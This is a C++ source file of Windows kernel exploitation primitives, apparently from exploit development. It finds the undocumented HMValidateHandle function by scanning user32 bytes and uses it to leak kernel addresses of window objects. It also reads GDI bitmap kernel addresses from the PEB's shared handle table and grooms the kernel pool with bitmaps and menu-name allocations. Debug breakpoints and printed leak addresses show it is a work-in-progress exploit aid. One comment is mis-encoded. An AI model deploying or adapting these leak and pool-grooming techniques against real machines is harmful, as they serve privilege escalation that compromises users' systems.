#include <Windows.h>
#include <iostream>

extern "C" HBITMAP hBitmap = NULL; 
#define FENGSHUICOUNT 0x1000
typedef void*(NTAPI *lHMValidateHandle)(HWND h, int type);

lHMValidateHandle pHmValidateHandle = NULL;

typedef struct _HEAD
{
	HANDLE h;
	DWORD  cLockObj;
} HEAD, *PHEAD;

typedef struct _THROBJHEAD
{
	HEAD h;
	PVOID pti;
} THROBJHEAD, *PTHROBJHEAD;
//
typedef struct _THRDESKHEAD
{
	THROBJHEAD h;
	PVOID    rpdesk;
	PVOID       pSelf;   // points to the kernel mode address
} THRDESKHEAD, *PTHRDESKHEAD;


BOOL FindHMValidateHandle() {
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL) {
		printf("Failed to load user32");
		return FALSE;
	}

	BYTE* pIsMenu = (BYTE *)GetProcAddress(hUser32, "IsMenu");
	if (pIsMenu == NULL) {
		printf("Failed to find location of exported function 'IsMenu' within user32.dll\n");
		return FALSE;
	}
	unsigned int uiHMValidateHandleOffset = 0;
	for (unsigned int i = 0; i < 0x1000; i++) {
		BYTE* test = pIsMenu + i;
		if (*test == 0xE8) {
			uiHMValidateHandleOffset = i + 1;
			break;
		}
	}
	if (uiHMValidateHandleOffset == 0) {
		printf("Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");
		return FALSE;
	}

	unsigned int addr = *(unsigned int *)(pIsMenu + uiHMValidateHandleOffset);
	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;
	//The +11 is to skip the padding bytes as on Windows 10 these aren't nops
	pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
	return TRUE;
}

DWORD64 getGdiShreadHandleTableAddr()
{
	DWORD64 tebAddr = (DWORD64)NtCurrentTeb();
	DWORD64 pebAddr = *(PDWORD64)((PUCHAR)tebAddr + 0x60);   // 0x60ÊÇPEBµÄÆ«ÒÆ
	DWORD64 GdiShreadHandleTableAddr = *(PDWORD64)((PUCHAR)pebAddr + 0xf8);
	return GdiShreadHandleTableAddr;
}

DWORD64 getBitMapAddr(HBITMAP hBitmap)
{
	WORD arrayIndex = LOWORD(hBitmap);
	return *(PDWORD64)(getGdiShreadHandleTableAddr() + arrayIndex * 0x18);
}


VOID fengShuiAllocByBitmap(HBITMAP *hBitmap, int nHole, int nSize)
{
	int nWidth = (nSize - 0x370) / 2 + 0x80;

	for (int i = 0; i < nHole; i++)
	{
		hBitmap[i] = CreateBitmap(nWidth, 2, 1, 8, NULL);
	}

}

VOID fengShuiAllocByLpszMenuName(int nStart, int nHole, int nSize)
{
	int nMalloc = (nSize - 0x20) / 2;
	CHAR* menuName = new CHAR[nMalloc];
	memset(menuName, 0x41, nMalloc);
	WNDCLASSEXA wns = {};
	wns.lpfnWndProc = DefWindowProcA;
	wns.lpszMenuName = menuName;
	wns.cbSize = sizeof(wns);

	for (int i = 0; i < nHole; i++)
	{
		char className[0x20] = {};
		wsprintf(className, "wjllz%d", i + nStart);
		wns.lpszClassName = className;
		if (!RegisterClassExA(&wns))
		{
			std::cout << "[+] RegisterClass failed!!!" << std::endl;
		}
	}
}

VOID fengShuiFreeByLpszMenuName(int nStart, int nHole)
{
	for (int i = 0; i < nHole; i++)
	{
		char className[0x20] = {};
		wsprintf(className, "wjllz%d", i + nStart);
		UnregisterClass(className, NULL);
	}
}

VOID fengShuiFreeByBitmap(HBITMAP *hBitmap, int nHole)
{

	for (int i = 0; i < nHole; i++)
	{
		if (hBitmap[i] != NULL) DeleteObject(hBitmap[i]);
	}

}


VOID poolFengShui()
{
	HBITMAP hBitmap[FENGSHUICOUNT] = {};

	fengShuiAllocByBitmap(hBitmap, FENGSHUICOUNT, 0x810);
	fengShuiAllocByBitmap(hBitmap, FENGSHUICOUNT, 0x5f0);
	fengShuiAllocByLpszMenuName(1, FENGSHUICOUNT + 1, 0x200);
	DWORD64 leakAddr = getBitMapAddr(hBitmap[0x100]);
	__debugbreak();
	std::cout << "[+] Leak Addr is: " << std::hex << leakAddr << std::endl;
	
	fengShuiFreeByBitmap(hBitmap, FENGSHUICOUNT);
	fengShuiAllocByBitmap(hBitmap, FENGSHUICOUNT, 0x530);
	fengShuiAllocByLpszMenuName(FENGSHUICOUNT + 1, FENGSHUICOUNT, 0xc0);
	fengShuiAllocByLpszMenuName(FENGSHUICOUNT * 2 + 1, 0x400, 0x200);
	fengShuiFreeByLpszMenuName(0x100, 0x400);

	leakAddr = getBitMapAddr(hBitmap[0x200]);
	__debugbreak();
	std::cout << "[+] Leak Addr is: " << std::hex << leakAddr << std::endl;
}

VOID leakLpszMenuName()
{
	WNDCLASSEXA wns = {};
	
	int nSize = 0x20;

	CHAR* menuName = new CHAR[nSize];
	memset(menuName, 0x41, nSize);

	wns.lpszClassName = "AAAA";
	wns.lpfnWndProc = DefWindowProcA;
	wns.lpszMenuName = menuName;
	wns.cbSize = sizeof(wns);

	if (!RegisterClassExA(&wns))
	{
		std::cout << "[+] RegisterClass failed!!!" << std::endl;
		return;
	}

	HWND hwnd = CreateWindowExA(0, wns.lpszClassName, NULL, NULL, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, NULL, NULL);
	PTHRDESKHEAD tagWND = (PTHRDESKHEAD)pHmValidateHandle(hwnd, 1);

	DWORD64 wndAddr = (DWORD64)tagWND->pSelf;
	//__debugbreak();
	std::cout << "[+] tagWND addr is: " << std::hex << wndAddr << std::endl;
}

int main()
{
	BOOL bFound = FindHMValidateHandle();
	if (!bFound)
	{
		printf("Failed to locate HmValidateHandle, exiting\n");
		return 1;
	}
	poolFengShui();
	//leakLpszMenuName();

	//poolFengShui();
	system("pause");
	return 0;
}